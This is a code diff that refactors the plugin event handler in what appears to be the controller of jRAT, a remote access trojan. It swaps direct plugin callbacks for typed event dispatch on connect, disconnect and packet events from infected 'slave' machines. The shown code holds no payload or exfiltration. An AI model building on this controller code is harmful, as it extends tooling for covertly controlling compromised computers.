@@ -1,7 +1,8 @@
 package se.jrat.controller.addons;
 
 import jrat.api.Packet;
-import jrat.api.RATPlugin;
+import jrat.api.events.Event;
+import jrat.api.events.EventType;
 import jrat.api.events.OnConnectEvent;
 import jrat.api.events.OnDisconnectEvent;
 import jrat.api.events.OnPacketEvent;
@@ -11,42 +12,34 @@ import se.jrat.controller.AbstractSlave;
 public class PluginEventHandler {
 
 	public static void onPacket(AbstractSlave slave, byte header) {
-		for (RATPlugin plugin : Plugins.getPlugins()) {
-			try {
-				plugin.onPacket(new OnPacketEvent(RATObjectFormat.format(slave), new Packet(header)));
-			} catch (Exception e) {
-				e.printStackTrace();
-			}
+		OnPacketEvent e = new OnPacketEvent(RATObjectFormat.format(slave), new Packet(header));
+		
+		for (Event event : Plugins.getHandler().getEvents(EventType.EVENT_CLIENT_PACKET_RECEIVED)) {
+			event.perform(e);
 		}
 	}
 
 	public static void onConnect(AbstractSlave slave) {
-		for (RATPlugin plugin : Plugins.getPlugins()) {
-			try {
-				plugin.onConnect(new OnConnectEvent(RATObjectFormat.format(slave)));
-			} catch (Exception e) {
-				e.printStackTrace();
-			}
+		OnConnectEvent e = new OnConnectEvent(RATObjectFormat.format(slave));
+		
+		for (Event event : Plugins.getHandler().getEvents(EventType.EVENT_CLIENT_CONNECT)) {
+			event.perform(e);
 		}
 	}
 
 	public static void onDisconnect(AbstractSlave slave) {
-		for (RATPlugin plugin : Plugins.getPlugins()) {
-			try {
-				plugin.onDisconnect(new OnDisconnectEvent(RATObjectFormat.format(slave)));
-			} catch (Exception e) {
-				e.printStackTrace();
-			}
+		OnDisconnectEvent e = new OnDisconnectEvent(RATObjectFormat.format(slave));
+		
+		for (Event event : Plugins.getHandler().getEvents(EventType.EVENT_CLIENT_DISCONNECT)) {
+			event.perform(e);
 		}
 	}
 
 	public static void onSendPacket(byte header, AbstractSlave slave) {
-		for (RATPlugin plugin : Plugins.getPlugins()) {
-			try {
-				plugin.onSendPacket(new OnSendPacketEvent(new Packet(header), RATObjectFormat.format(slave)));
-			} catch (Exception e) {
-				e.printStackTrace();
-			}
+		OnSendPacketEvent e = new OnSendPacketEvent(new Packet(header), RATObjectFormat.format(slave));
+		
+		for (Event event : Plugins.getHandler().getEvents(EventType.EVENT_SERVER_PACKET_SEND)) {
+			event.perform(e);
 		}
 	}
 
